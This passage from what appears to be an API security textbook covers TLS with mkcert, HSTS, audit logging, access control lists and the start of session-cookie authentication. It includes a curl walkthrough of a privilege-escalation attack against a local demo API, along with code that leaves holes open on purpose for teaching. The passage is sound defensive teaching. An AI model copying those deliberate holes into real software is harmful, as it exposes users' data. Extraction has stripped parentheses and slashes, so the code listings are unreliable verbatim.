straightforward. First, you need to generate a certificate that the API will use to authenticate itself to its clients. TLS certificates are covered in depth in chapter 7. When a client connects to your API it will use a URI that  includes  the  hostname  of  the  server  the  API  is  running  on,  for  example  api .example.com.  The  server  must  present  a  certificate,  signed  by  a  trusted  certificate authority  CA , that says that it really is the server for api.example.com. If an invalid certificate is presented, or it doesn’t match the host that the client wanted to connect to, then the client will abort the connection. Without this step, the client might be tricked into connecting to the wrong server and then send its password or other confi- dential data to the imposter.   Because you’re enabling HTTPS for development purposes only, you could use a self-signed  certificate.  In  later  chapters  you  will  connect  to  the  API  directly  in  a  web browser, so it is much easier to use a certificate signed by a local CA. Most web brows- ers do not like self-signed certificates. A tool called mkcert  https:  mkcert.dev  sim- plifies the process considerably. Follow the instructions on the mkcert homepage to install it, and then run  mkcert -install  to generate the CA certificate and install it. The CA cert will automatically be marked as trusted by web browsers installed on your operating system.  DEFINITION A self-signed certificate is a certificate that has been signed using the private key associated with that same certificate, rather than by a trusted cer- tificate authority. Self-signed certificates should be used only when you have a direct trust relationship with the certificate owner, such as when you gener- ated the certificate yourself.  You  can  now  generate  a  certificate  for  your  Spark  server  running  on  localhost.  By default,  mkcert  generates  certificates  in  Privacy  Enhanced  Mail   PEM   format.  For Java, you need the certificate in PKCS12 format, so run the following command in the root folder of the Natter project to generate a certificate for localhost:  mkcert -pkcs12 localhost   Using encryption to keep data private  81  The certificate and private key will be generated in a file called  localhost.p12. By default, the password for this file is changeit. You can now enable HTTPS support in Spark by adding a call to the secure   static method, as shown in listing 3.4. The first two arguments to the method give the name of the keystore file containing the server certificate  and  private  key.  Leave  the  remaining  arguments  as  null;  these  are  only needed if you want to support client certificate authentication  which is covered in chapter 11 .  WARNING The CA certificate and  private key that  mkcert generates  can be used to generate certificates for any website that will be trusted by your browser. Do not share these files or send them to anybody. When you have finished development, consider running mkcert -uninstall to remove the CA from your system trust stores.  Listing 3.4 Enabling HTTPS   import static spark.Spark.secure;      Import the secure method.  public class Main {   public static void main String... args  throws Exception {     secure "localhost.p12", "changeit", null, null ;         ..   } }  Enable HTTPS support  at the start of the main  method.  Restart  the  server  for  the  changes  to  take  effect.  If  you  started  the  server  from  the command line, then you can use Ctrl-C to interrupt the process and then simply run it again. If you started the server from your IDE, then there should be a button to restart the process.   Finally, you can call your API  after restarting the server . If curl refuses to con- nect, you can use the --cacert option to curl to tell it to trust the mkcert certificate:  $ curl --cacert "$ mkcert -CAROOT  rootCA.pem"   ➥ -d ‘{"username":"demo","password":"password"}’  ➥ -H ‘Content-Type: application json’ https:  localhost:4567 users  {"username":"demo"}  WARNING Don’t be tempted to disable TLS certificate validation by passing the  -k  or  --insecure  options  to  curl   or  similar  options  in  an  HTTPS library . Although this may be OK in a development environment, disabling certificate  validation  in  a  production  environment  undermines  the  security guarantees of TLS. Get into the habit of generating and using correct certifi- cates. It’s not much harder, and you’re less likely to make mistakes later.   82  3.4.2  CHAPTER 3 Securing the Natter API  Strict transport security When a user visits a website in a browser, the browser will first attempt to connect to the non-secure HTTP version of a page as many websites still do not support HTTPS. A secure site will redirect the browser to the HTTPS version of the page. For an API, you should only expose the API over HTTPS because users will not be directly con- necting to the API endpoints using a web browser and so you do not need to support this legacy behavior. API clients also often send sensitive data such as passwords on the first request so it is better to completely reject non-HTTPS requests. If for some rea- son you do need to support web browsers directly connecting to your API endpoints, then best practice is to immediately redirect them to the HTTPS version of the API and to set the HTTP Strict-Transport-Security  HSTS  header to instruct the browser to always use the HTTPS version in future. If you add the following line to the after- After filter in your main method, it will add an HSTS header to all responses:    response.header "Strict-Transport-Security", "max-age=31536000" ;  TIP Adding a HSTS header for localhost is not a good idea as it will prevent you  from  running  development  servers  over  plain  HTTP  until  the max-age attribute expires. If you want to try it out, set a short max-age value.  Pop quiz 5 Recalling the CIA triad from chapter 1, which one of the following security goals is  not provided by TLS? a Confidentiality b c Availability  Integrity  The answer is at the end of the chapter.  3.5  Audit logging for accountability Accountability relies on being able to determine who did what and when. The sim- plest way to do this is to keep a log of actions that people perform using your API, known as an audit log. Figure 3.6 repeats the mental model that you should have for the mechanisms discussed in this chapter. Audit logging should occur after authenti- cation, so that you know who is performing an action, but before you make authoriza- tion decisions that may deny access. The reason for this is that you want to record all attempted  operations,  not just  the successful ones.  Unsuccessful attempts  to  perform actions may be indications of an attempted attack. It’s difficult to overstate the impor- tance of good audit logging to the security of an API. Audit logs should be written to durable storage, such as the file system or a database, so that the audit logs will survive if the process crashes for any reason.   Audit logging for accountability  83  Audit logging occurs after authentication so we know who is sending the request.

A u d i t   l  o g  Audit DB  Figure 3.6 Audit logging should occur both before a request is processed and after it completes.  When implemented as a filter, it should be placed after authentication, so that you know who is  performing each action, but before access control checks so that you record operations that were  attempted but denied.  Thankfully, given the importance of audit logging, it’s easy to add some basic logging capability to your API. In this case, you’ll log into a database table so that you can eas- ily view and search the logs from the API itself.  TIP In a production environment you typically will want to send audit logs to a centralized log collection and analysis tool, known as a SIEM  Security Information and Event Management  system, so they can be correlated with logs  from  other  systems  and  analyzed  for  potential  threats  and  unusual behavior.  As for previous new functionality, you’ll add a new database table to store the audit logs. Each entry will have an identifier  used to correlate the request and response logs , along with some details of the request and the response. Add the following table definition to schema.sql.  NOTE The audit table should not have any reference constraints to any other tables. Audit logs should be recorded based on the request, even if the details are inconsistent with other data.  CREATE TABLE audit_log      audit_id INT NULL,     method VARCHAR 10  NOT NULL,     path VARCHAR 100  NOT NULL,     user_id VARCHAR 30  NULL,     status INT NULL,   84  CHAPTER 3 Securing the Natter API      audit_time TIMESTAMP NOT NULL  ; CREATE SEQUENCE audit_id_seq;  As before, you also need to grant appropriate permissions to the natter_api_user, so in the same file add the following line to the bottom of the file and save:  GRANT SELECT, INSERT ON audit_log TO natter_api_user;  A new controller can now be added to handle the audit logging. You split the logging into two filters, one that occurs before the request is processed  after authentication , and one that occurs after the response has been produced. You’ll also allow access to the logs to anyone for illustration purposes. You should normally lock down audit logs to only a small number of trusted users, as they are often sensitive in themselves. Often the users that can access audit logs  auditors  are different from the normal system adminis- trators, as administrator accounts are the most privileged and so most in need of moni- toring. This is an important security principle known as separation of duties.  DEFINITION The principle of separation of duties requires that different aspects of privileged actions should be controlled by different people, so that no one person is solely responsible for the action. For example, a system administra- tor should not also be responsible for managing the audit logs for that system. In financial systems, separation of duties is often used to ensure that the per- son  who  requests  a  payment  is  not  also  the  same  person  who  approves  the payment, providing a check against fraud.  In your editor, navigate to src main java com manning apisecurityinaction controller and create a new file called AuditController.java. Listing 3.5 shows the content of this new controller that you should copy into the file and save. As mentioned, the logging is split into two filters: one of which runs before each operation, and one which runs afterward. This ensures that if the process crashes while processing a request you can still see what requests were being processed at the time. If you only logged responses, then you’d lose any trace of a request if the process crashes, which would be a prob- lem if an attacker found a request that caused the crash. To allow somebody reviewing the logs to correlate requests with responses, generate a unique audit log ID in the auditRequestStart method and add it as an attribute to the request. In the audit- RequestEnd method, you can then retrieve the same audit log ID so that the two log events can be tied together.  Listing 3.5 The audit log controller  package com.manning.apisecurityinaction.controller;  import org.dalesbred.*; import org.json.*; import spark.*;   Audit logging for accountability  85  import java.sql.*; import java.time.*; import java.time.temporal.*;  public class AuditController {    private final Database database;    public AuditController Database database  {     this.database = database;   }    public void auditRequestStart Request request, Response response  {     database.withVoidTransaction tx -> {       var auditId = database.findUniqueLong                  "SELECT NEXT VALUE FOR audit_id_seq" ;         request.attribute "audit_id", auditId ;            database.updateUnique            "INSERT INTO audit_log audit_id, method, path, " +               "user_id, audit_time  " +             "VALUES ?, ?, ?, ?, current_timestamp ",           auditId,            request.requestMethod  ,            request.pathInfo  ,           request.attribute "subject"  ;     } ;   }  Generate a new audit id before  the request is processed and  save it as an attribute on the  request.    public void auditRequestEnd Request request, Response response  {     database.updateUnique          "INSERT INTO audit_log audit_id, method, path, status, " +             "user_id, audit_time  " +           "VALUES ?, ?, ?, ?, ?, current_timestamp ",         request.attribute "audit_id" ,             request.requestMethod  ,         request.pathInfo  ,          response.status  ,         request.attribute "subject"  ;   } }  When processing the  response, look up  the audit id from the  request attributes.  Listing 3.6 shows the code for reading entries from the audit log for the last hour. The entries are queried from the database and converted into JSON objects using a cus- tom RowMapper method. The list of records is then returned as a JSON array. A simple limit is added to the query to prevent too many results from being returned.  Listing 3.6 Reading audit log entries  public JSONArray readAuditLog Request request, Response response  {     var since = Instant.now  .minus 1, ChronoUnit.HOURS ;             var logs = database.findAll AuditController::recordToJson,                "SELECT * FROM audit_log " +                                              "WHERE audit_time >= ? LIMIT 20", since ;      Read log  entries for  the last hour.   86  CHAPTER 3 Securing the Natter API      return new JSONArray logs ;     }  Convert each entry into a JSON  object and collect as a JSON array.  private static JSONObject recordToJson ResultSet row                           throws SQLException {                                              return new JSONObject                                                          .put "id", row.getLong "audit_id"                                      .put "method", row.getString "method"                                  .put "path", row.getString "path"                                      .put "status", row.getInt "status"                                     .put "user", row.getString "user_id"                                   .put "time", row.getTimestamp "audit_time" .toInstant   ;  }                                                                       Use a helper  method to  convert the  records to  JSON.  We can then wire this new controller into your main method, taking care to insert the filter between your authentication filter and the access control filters for individual operations. Because Spark filters must either run before or after  and not around  an API call, you define separate filters to run before and after each request.    Open the Main.java file in your editor and locate the lines that install the filters for  authentication.  Audit  logging  should  come  straight  after  authentication,  so  you should  add  the  audit  filters  in  between  the  authentication  filter  and  the  first  route definition,  as  highlighted  in  bold  in  this  next  snippet.  Add  the  indicated  lines  and then save the file.    before userController::authenticate ;    var auditController = new AuditController database ;     before auditController::auditRequestStart ;              afterAfter auditController::auditRequestEnd ;           Add these lines to  create and register  the audit controller.    post " spaces",       spaceController::createSpace ;  Finally, you can register a new  unsecured  endpoint for reading the logs. Again, in a production environment this should be disabled or locked down:    get " logs", auditController::readAuditLog ;  Once  installed  and  the  server  has  been  restarted,  make  some  sample  requests,  and then view the audit log. You can use the jq utility  https:  stedolan.github.io jq   to pretty-print the output:  $ curl pem https:  localhost:4567 logs  jq  [   {     "path": " users",     "method": "POST",     "id": 1,     "time": "2019-02-06T17:22:44.123Z"   },   Access control  87    {     "path": " users",     "method": "POST",     "id": 1,     "time": "2019-02-06T17:22:44.237Z",     "status": 201   },   {     "path": " spaces 1 messages 1",     "method": "DELETE",     "id": 2,     "time": "2019-02-06T17:22:55.266Z",     "user": "demo"   },... ]  This style of log is a basic access log, that logs the raw HTTP requests and responses to your API. Another way to create an audit log is to capture events in the business logic layer of your application, such as User Created or Message Posted events. These events describe the essential details of what happened without reference to the specific pro- tocol used to access the API. Yet another approach is to capture audit events directly in the database using triggers to detect when data is changed. The advantage of these alternative approaches is that they ensure that events are logged no matter how the API is accessed, for example, if the same API is available over HTTP or using a binary RPC  protocol.  The  disadvantage  is  that  some  details  are  lost,  and  some  potential attacks may be missed due to this missing detail.  Pop quiz 6 Which secure design principle would indicate that audit logs should be managed  by different users than the normal system administrators? a The Peter principle b The principle of least privilege c The principle of defense in depth d The principle of separation of duties e The principle of security through obscurity  The answer is at the end of the chapter.  3.6  Access control You now have a reasonably secure password-based authentication mechanism in place, along with HTTPS to secure data and passwords in transmission between the API cli- ent and server. However, you’re still letting any user perform any action. Any user can post a message to any social space and read all the messages in that space. Any user can also decide to be a moderator and delete messages from other users. To fix this, you’ll now implement basic access control checks.   88  CHAPTER 3 Securing the Natter API   Access control should happen after authentication, so that you know who is trying to perform the action, as shown in figure 3.7. If the request is granted, then it can pro- ceed through to the application logic. However, if it is denied by the access control rules,  then  it  should  be  failed  immediately,  and  an  error  response  returned  to  the user. The two main HTTP status codes for indicating that access has been denied are 401 Unauthorized and 403 Forbidden. See the sidebar for details on what these two codes mean and when to use one or the other.  Request  Web browser  Mobile app  R a  t  e - l i  m  i t i  n g  A u  t  h e n  t i c a  t i  o n  A u d  i t   l  o g  A c c e s s     c o n t r o  l  When access is granted, the request proceeds to the main API logic.  Natter API  Application  logic  Response  Forbidden requests are always logged.  When access is denied, the request is immediately returned with a 403 Forbidden.  Figure 3.7 Access control occurs after authentication and the request has been logged for audit.  If access is denied, then a forbidden response is immediately returned without running any of the  application logic. If access is granted, then the request proceeds as normal.  HTTP 401 and 403 status codes HTTP includes two standard status codes for indicating that the client failed security checks, and it can be confusing to know which status to use in which situations.   The  401  Unauthorized  status  code,  despite  the  name,  indicates  that  the  server required authentication for this request but the client either failed to provide any cre- dentials, or they were incorrect, or they were of the wrong type. The server doesn’t know if the user is authorized or not because they don’t know who they are. The client  or user   may  be  able  fix  the  situation  by  trying  different  credentials.  A  standard  WWW- Authenticate header can be returned to tell the client what credentials it needs, which it will then return in the Authorization header. Confused yet? Unfortunately, the HTTP specifications use the words authorization and authentication as if they were identical.  The 403 Forbidden status code, on the other hand, tells the client that its creden- tials were fine for authentication, but that it’s not allowed to perform the operation it requested. This is a failure of authorization, not authentication. The client cannot typ- ically do anything about this other than ask the administrator for access.   Access control  89  3.6.1  Enforcing authentication The most basic access control check is simply to require that all users are authenti- cated.  This  ensures  that  only  genuine  users  of  the  API  can  gain  access,  while  not enforcing any further requirements. You can enforce this with a simple filter that runs after authentication and verifies that a genuine subject has been recorded in the request attributes. If no subject attribute is found, then it rejects the request with a 401 status code and adds a standard WWW-Authenticate header to inform the client that the user should  authenticate  with  Basic  authentication.  Open  the  UserController.java  file  in your editor, and add the following method, which can be used as a Spark before filter to enforce that users are authenticated:  public void requireAuthentication Request request,     Response response  {   if  request.attribute "subject"  == null  {     response.header "WWW-Authenticate",         "Basic realm=\" \", charset=\"UTF-8\"" ;     halt 401 ;   } }  You can then open the Main.java file and require that all calls to the Spaces API are authenticated,  by  adding  the  following  filter  definition.  As  shown  in  figure  3.7  and throughout this chapter, access control checks like this should be added after authen- tication and audit logging. Locate the line where you added the authentication filter earlier and add a filter to enforce authentication on all requests to the API that start with the  spaces URL path, so that the code looks like the following:  before userController::authenticate ;       First, try to authenticate the user.  before auditController::auditRequestStart ;        afterAfter auditController::auditRequestEnd ;      before " spaces", userController::requireAuthentication ;      post " spaces", spaceController::createSpace ;  ..  Then perform  audit logging.  Finally, add the check if  authentication was  successful.  If you save the file and restart the server, you can now see unauthenticated requests to create a space be rejected with a 401 error asking for authentication, as in the follow- ing example:  $ curl -i -d ‘{"name":"test space","owner":"demo"}’ ➥ -H ‘Content-Type: application json’ https:  localhost:4567 spaces HTTP 1.1 401 Unauthorized Date: Mon, 18 Mar 2019 14:51:40 GMT WWW-Authenticate: Basic realm=" ", charset="UTF-8" ...  Retrying the request with authentication credentials allows it to succeed:   90  CHAPTER 3 Securing the Natter API  $ curl -i -d ‘{"name":"test space","owner":"demo"}’ ➥ -H ‘Content-Type: application json’ -u demo:changeit ➥ https:  localhost:4567 spaces HTTP 1.1 201 Created ... {"name":"test space","uri":" spaces 1"}  3.6.2  Access control lists Beyond simply requiring that users are authenticated, you may also want to impose additional restrictions on who can perform certain operations. In this section, you’ll implement a very simple access control method based upon whether a user is a mem- ber of the social space they are trying to access. You’ll accomplish this by keeping track of which users are members of which social spaces in a structure known as an access control list  ACL .    Each entry for a space will list a user that may access that space, along with a set of permissions that define what they can do. The Natter API has three permissions: read messages in a space, post messages to that space, and a delete permission granted to moderators.  DEFINITION An access control list is a list of users that can access a given object, together with a set of permissions that define what each user can do.  Why not simply let all authenticated users perform any operation? In some APIs this may be an appropriate security model, but for most APIs some operations are more sensitive than others. For example, you might let anyone in your company see their own salary information in your payroll API, but the ability to change somebody’s sal- ary is not normally something you would allow any employee to do! Recall the princi- ple of least authority  POLA  from chapter 1, which says that any user  or process  should be given exactly the right amount of authority to do the jobs they need to do. Too many permissions and they may cause damage to the system. Too few permissions and they may try to work around the security of the system to get their job done.   Permissions will be granted to users in a new  permissions table, which links a user to a set of permissions in a given social space. For simplicity, you’ll represent permissions as a string of the characters r  read , w  write , and d  delete . Add the following table definition to the bottom of schema.sql in your text editor and save the new definition. It must come after the spaces and users table definitions as it references them to ensure that permissions can only be granted for spaces that exist and real users.  CREATE TABLE permissions      space_id INT NOT NULL REFERENCES spaces space_id ,     user_id VARCHAR 30  NOT NULL REFERENCES users user_id ,     perms VARCHAR 3  NOT NULL,     PRIMARY KEY  space_id, user_id   ; GRANT SELECT, INSERT ON permissions TO natter_api_user;   Access control  91  You then need to make sure that the initial owner of a space gets given all permissions. You can update the createSpace method to grant all permissions to the owner in the same transaction that we create the space. Open SpaceController.java in your text editor and locate the createSpace method. Add the lines highlighted in the following listing:  return database.withTransaction tx -> {       var spaceId = database.findUniqueLong            "SELECT NEXT VALUE FOR space_id_seq;" ;        database.updateUnique            "INSERT INTO spaces space_id, name, owner  " +               "VALUES ?, ?, ? ;", spaceId, spaceName, owner ;        database.updateUnique                                                  "INSERT INTO permissions space_id, user_id, perms  " +                 "VALUES ?, ?, ? ", spaceId, owner, "rwd" ;            Ensure the space owner has all permissions on the newly created space.        response.status 201 ;       response.header "Location", " spaces " + spaceId ;        return new JSONObject             .put "name", spaceName            .put "uri", " spaces " + spaceId ;     } ;  You now need to add checks to enforce that the user has appropriate permissions for the  actions  that  they  are  trying  to  perform.  You  could  hard-code  these  checks  into each individual method, but it’s much more maintainable to enforce access control decisions using filters that run before the controller is even called. This separation of concerns ensures that the controller can concentrate on the core logic of the opera- tion, without having to worry about access control details. This also ensures that if you ever want to change how access control is performed, you can do this in the common filter rather than changing every single controller method.  NOTE Access  control  checks  are  often  included  directly  in  business  logic, because  who  has  access  to  what  is  ultimately  a  business  decision.  This  also ensures that access control rules are consistently applied no matter how that functionality is accessed. On the other hand, separating out the access con- trol checks makes it easier to centralize policy management, as you’ll see in chapter 8.  To enforce your access control rules, you need a filter that can determine whether the authenticated user has the appropriate permissions to perform a given operation on a given  space.  Rather  than  have  one  filter  that  tries  to  determine  what  operation  is being performed by examining the request, you’ll instead write a factory method that returns a new filter given details about the operation. You can then use this to create specific filters for each  operation. Listing  3.7  shows  how to  implement this filter in your UserController class.    92  CHAPTER 3 Securing the Natter API    Open  UserController.java  and  add  the  method  in listing  3.7 to  the  class  under- neath the other existing methods. The method takes as input the name of the HTTP method being performed and the permission required. If the HTTP method does not match,  then  you  skip  validation  for  this  operation,  and  let  other  filters  handle  it. Before you can enforce any access control rules, you must first ensure that the user is authenticated, so add a call to the existing requireAuthentication filter. Then you can look up the authenticated user in the user database and determine if they have the required permissions to perform this action, in this case by a simple string match- ing against the permission letters. For more complex cases, you might want to convert the permissions into a Set object and explicitly check that all required permissions are contained in the set of permissions of the user.  TIP The Java EnumSet class can be used to efficiently represent a set of per- missions as a bit vector, providing a compact and fast way to quickly check if a user has a set of required permissions.  If the user does not have the required permissions, then you should fail the request with a 403 Forbidden status code. This tells the user that they are not allowed to per- form the operation that they are requesting.  Return a new Spark filter as a lambda expression.  First check if the user is authenticated.  Listing 3.7 Checking permissions in a filter     public Filter requirePermission String method, String permission  {     return  request, response  -> {          if  !method.equalsIgnoreCase request.requestMethod     {             return;                                                          }                                                             Ignore requests  that don’t match the  request method.        requireAuthentication request, response ;             var spaceId = Long.parseLong request.params ":spaceId"  ;       var username =  String  request.attribute "subject" ;        var perms = database.findOptional String.class,              "SELECT perms FROM permissions " +                           "WHERE space_id = ? AND user_id = ?",                spaceId, username .orElse "" ;                  Look up permissions for  the current user in the  given space, defaulting  to no permissions.        if  !perms.contains permission   {            halt 403 ;                                }                                         };   }  If the user doesn’t have  permission, then halt with  a 403 Forbidden status.  3.6.3  Enforcing access control in Natter You can now add filters to each operation in your main method, as shown in listing 3.8. Before each Spark route you add a new before   filter that enforces correct permis- sions. Each filter path has to have a  :spaceId path parameter so that the filter can   Access control  93  determine which space is being operated on. Open the Main.java class in your editor and ensure that your main   method matches the contents of listing 3.8. New filters enforcing permission checks are highlighted in bold.

It’s going to be a pretty antisocial social network unless you can add other users! You can add a new operation that allows another user to be added to a space by any existing user that has read permission on that space. The next listing adds an operation to the SpaceController to allow this.   Open SpaceController.java  in  your  editor and add  the  addMember method  from listing 3.9 to the class. First, validate that the permissions given match the rwd form that you’ve been using. You can do this using a regular expression. If so, then insert the permissions for that user into the permissions ACL table in the database.  Listing 3.9 Adding users to a space  public JSONObject addMember Request request, Response response  {     var json = new JSONObject request.body   ;     var spaceId = Long.parseLong request.params ":spaceId"  ;     var userToAdd = json.getString "username" ;     var perms = json.getString "permissions" ;      if  !perms.matches "r?w?d?"   {                  throw new IllegalArgumentException "invalid permissions" ;     }  Ensure the permissions  granted are valid.  Update the permissions for the  user in the access control list.      database.updateUnique                 "INSERT INTO permissions space_id, user_id, perms  " +             "VALUES ?, ?, ? ;", spaceId, userToAdd, perms ;      response.status 200 ;     return new JSONObject           .put "username", userToAdd          .put "permissions", perms ;   }  You can then add a new route to your main method to allow adding a new member by POSTing  to   spaces :spaceId members.  Open  Main.java  in  your  editor  again  and add the following new route and access control filter to the main method underneath the existing routes:    before " spaces :spaceId members",       userController.requirePermission "POST", "r"  ;   post " spaces :spaceId members", spaceController::addMember ;   Access control  95  You can test this by adding the demo2 user to the space and letting them read messages:  $ curl -u demo:password  ➥ -H ‘Content-Type: application json’  ➥ -d ‘{"username":"demo2","permissions":"r"}’  ➥ https:  localhost:4567 spaces 1 members  {"permissions":"r","username":"demo2"} $ curl -u demo2:password  ➥ https:  localhost:4567 spaces 1 messages 1  {"author":"demo","time":"2019-02-06T15:15:03.138Z","message":"Hello,   World!","uri":" spaces 1 messages 1"}  3.6.5  Avoiding privilege escalation attacks It turns out that the demo2 user you just added can do a bit more than just read mes- sages. The permissions on the addMember method allow any user with read access to add new users to the space and they can choose the permissions for the new user. So demo2 can simply create a new account for themselves and grant it more permissions than you originally gave them, as shown in the following example.   First, they create the new user:  $ curl -H ‘Content-Type: application json’  ➥ -d ‘{"username":"evildemo2","password":"password"}’ ➥ https:  localhost:4567 users ➥ {"username":"evildemo2"}  They then add that user to the space with full permissions:  $ curl -u demo2:password  ➥ -H ‘Content-Type: application json’  ➥ -d ‘{"username":"evildemo2","permissions":"rwd"}’  ➥ https:  localhost:4567 spaces 1 members {"permissions":"rwd","username":"evildemo2"}  They can now do whatever they like, including deleting your messages:  $ curl -i -X DELETE -u evildemo2:password  ➥ https:  localhost:4567 spaces 1 messages 1 HTTP 1.1 200 OK ...  What happened here is that although the demo2 user was only granted read permis- sion on the space, they could then use that read permission to add a new user that has full permissions on the space. This is known as a privilege escalation, where a user with lower privileges can exploit a bug to give themselves higher privileges.   DEFINITION A privilege escalation  or  elevation of privilege  occurs when a  user with limited permissions can exploit a bug in the system to grant themselves or somebody else more permissions than they have been granted.   96  CHAPTER 3 Securing the Natter API  You can fix this in two general ways:  1 You can require that the permissions granted to the new user are no more than the permissions that are granted to the existing user. That is, you should ensure that evildemo2 is only granted the same access as the demo2 user.  2 You can require that only users with all permissions can add other users.  For simplicity you’ll implement the second option and change the authorization filter on  the  addMember  operation  to  require  all  permissions.  Effectively,  this  means  that only the owner or other moderators can add new members to a social space.    Open the Main.java file and locate the before filter that grants access to add users  to a social space. Change the permissions required from r to rwd as follows:    before " spaces :spaceId members",       userController.requirePermission "POST", "rwd"  ;  If you retry the attack with demo2 again you’ll find that they are no longer able to cre- ate any users, let alone one with elevated privileges.

Summary   Use threat-modelling with STRIDE to identify threats to your API. Select appro-  priate security controls for each type of threat.   Apply rate-limiting to mitigate DoS attacks. Rate limits are best enforced in a load balancer or reverse proxy but can also be applied per-server for defense in depth.   Enable HTTPS for all API communications to ensure confidentiality and integ- rity of requests and responses. Add HSTS headers to tell web browser clients to always use HTTPS.   Use authentication to identify users and prevent spoofing attacks. Use a secure  password-hashing scheme like Scrypt to store user passwords.   All significant operations on the system should be recorded in an audit log, including  details  of  who  performed  the  action,  when,  and  whether  it  was successful.   Enforce  access  control  after  authentication.

Part 2  Token-based authentication  Token-based  authentication  is  the  dominant  approach  to  securing  APIs,  with a wide variety of techniques and approaches. Each approach has different trade-offs and are suitable in different scenarios. In this part of the book, you’ll examine the most commonly used approaches.   Chapter 4 covers traditional session cookies for first-party browser-based apps and shows how to adapt traditional web application security techniques for use in APIs.    Chapter  5  looks  at  token-based  authentication  without  cookies  using  the standard Bearer authentication scheme. The focus in this chapter is on building APIs that can be accessed from other sites and from mobile or desktop apps.   Chapter 6 discusses self-contained token formats such as JSON Web Tokens. You’ll see how to protect tokens from tampering using message authentication codes and encryption, and how to handle logout.       Session cookie authentication  This chapter covers  Building a simple web-based client and UI  Implementing token-based authentication  Using session cookies in an API  Preventing cross-site request forgery attacks  So far, you have required API clients to submit a username and password on every API request to enforce authentication. Although simple, this approach has several downsides from both a security and usability point of view. In this chapter, you’ll learn  about  those  downsides  and  implement  an  alternative  known  as  token-based authentication, where the username and password are supplied once to a dedicated login endpoint. A time-limited token is then issued to the client that can be used in place of the user’s credentials for subsequent API calls. You will extend the Natter API  with  a  login  endpoint  and  simple  session  cookies  and  learn  how  to  protect those  against  Cross-Site  Request  Forgery   CSRF   and  other  attacks. The  focus  of this chapter is authentication of browser-based clients hosted on the same site as the  API.  Chapter  5  covers  techniques  for  clients  on  other  domains  and  non- browser clients such as mobile apps.     101   102  4.1  CHAPTER 4 Session cookie authentication  DEFINITION In  token-based  authentication,  a  user’s  real  credentials  are  pre- sented once, and the client is then given a short-lived token. A token is typically a  short,  random  string  that  can  be  used  to  authenticate  API  calls  until  the token expires.  Authentication in web browsers In chapter 3, you learned about HTTP Basic authentication, in which the username and password are encoded and sent in an HTTP Authorization header. An API on its own is not very user friendly, so you’ll usually implement a user interface  UI  on top. Imagine that you are creating a UI for Natter that will use the API under the hood but create a compelling web-based user experience on top. In a web browser, you’d use web technol- ogies such as HTML, CSS, and JavaScript. This isn’t a book about UI design, so you’re not going to spend a lot of time creating a fancy UI, but an API that must serve web browser clients cannot ignore UI issues entirely. In this first section, you’ll create a very simple UI to talk to the Natter API to see how the browser interacts with HTTP Basic authentication and some of the drawbacks of that approach. You’ll then develop a more web-friendly alternative authentication mechanism later in the chapter. Figure 4.1 shows the rendered HTML page in a browser. It’s not going to win any awards for style, but it gets the job done. For a more in-depth treatment of the nuts and bolts of building UIs in JavaScript, there are many good books available, such  as Michael S. Mikowski and Josh C. Powell’s excellent Single Page Web Applications  Manning, 2014 .  Figure 4.1 A simple web UI  for creating a social space  with the Natter API  4.1.1  Calling the Natter API from JavaScript Because your API requires JSON requests, which aren’t supported by standard HTML form controls, you need to make calls to the API with JavaScript code, using either the older  XMLHttpRequest object or the newer Fetch API in the browser. You’ll use the Fetch  interface  in  this  example  because  it  is  much  simpler  and  already  widely  sup- ported by browsers. Listing 4.1 shows a simple JavaScript client for calling the Natter API createSpace operation from within a browser. The createSpace function takes the  name  of  the space  and  the  owner  as  arguments and  calls  the  Natter  REST  API using the browser Fetch API. The name and owner are combined into a JSON body, and you should specify the correct Content-Type header so that the Natter API doesn’t   Authentication in web browsers  103  reject the request. The fetch call sets the credentials attribute to include, to ensure that HTTP Basic credentials are set on the request; otherwise, they would not be, and the request would fail to authenticate.   To access the API, create a new folder named public in the Natter project, under- neath the src main resources folder. Inside that new folder, create a new file called natter.js in your text editor and enter the code from listing 4.1 and save the file. The new file should appear in the project under src main resources public natter.js.  Listing 4.1 Calling the Natter API from JavaScript  const apiUrl = 'https:  localhost:4567';  function createSpace name, owner  {     let data = {name: name, owner: owner};  Use the Fetch API to call  the Natter API endpoint.      fetch apiUrl + ' spaces', {             method: 'POST',         credentials: 'include',         body: JSON.stringify data ,                       headers: {                                            'Content-Type': 'application json'            }     }      .then response => {         if  response.ok  {                                   return response.json  ;                      } else {                                             throw Error response.statusText ;            }     }      .then json => console.log 'Created space: ', json.name, json.uri       .catch error => console.error 'Error: ', error  ;}  Pass the request data as  JSON with the correct  Content-Type.  Parse the response  JSON or throw an error  if unsuccessful.  The Fetch API is designed to be asynchronous, so rather than returning the result of the REST call directly it instead returns a Promise object, which can be used to regis- ter  functions  to  be  called  when  the  operation  completes.  You  don’t  need  to  worry about the details of that for this example, but just be aware that everything within the .then response => . . .   section is executed if the request completed successfully, whereas everything in the .catch error  =>  .  .  .    section is executed if a network error occurs. If the request succeeds, then parse the response as JSON and log the details to the JavaScript console. Otherwise, any error is also logged to the console. The response.ok field indicates whether the HTTP status code was in the range 200– 299, because these indicate successful responses in HTTP.   Create a new file called natter.html under src main resources public, alongside the natter.js file you just created. Copy in the HTML from listing 4.2, and click Save. The  HTML  includes  the  natter.js  script  you  just  created  and  displays  the  simple HTML form with fields for typing the space name and owner of the new space to be created. You can style the form with CSS if you want to make it a bit less ugly. The CSS   104  CHAPTER 4 Session cookie authentication  in the listing just ensures that each form field is on a new line by filling up all remain- ing space with a large margin.  Include the  natter.js script  file.  Listing 4.2 The Natter UI HTML               Natter!                         input { margin-right: 100% }                        Create Space                     Space name: <input name="spaceName" type="text"                                 id="spaceName">                Owner:                  Create               The HTML form has an ID  and some simple fields.  Style the form as  you wish using CSS.  4.1.2  Intercepting form submission Because web browsers do not know how to submit JSON to a REST API, you need to instruct the browser to call your createSpace function when the form is submitted instead of its default behavior. To do this, you can add more JavaScript to intercept the submit event for the form and call the function. You also need to suppress the default behavior to prevent the browser trying to directly submit the form to the server. Listing 4.3 shows the code to implement this. Open the natter.js file you created ear- lier in your text editor and copy the code from the listing into the file after the exist- ing createSpace function.    The code in the listing first registers a handler for the load event on the window object, which will be called after the document has finished loading. Inside that event handler, it then finds the form element and registers a new handler to be called when the  form  is  submitted.  The  form  submission  handler  first  suppresses  the  browser default behavior, by calling the .preventDefault   method on the event object, and then calls your createSpace function with the values from the form. Finally, the func- tion returns false to prevent the event being further processed.  Listing 4.3 Intercepting the form submission  window.addEventListener 'load', function e  {                 document.getElementById 'createSpace'                         .addEventListener 'submit', processFormSubmit ;   } ;  When the document  loads, add an event  listener to intercept  the form submission.   Authentication in web browsers  105  function processFormSubmit e  {     e.preventDefault  ;        Suppress the default  form 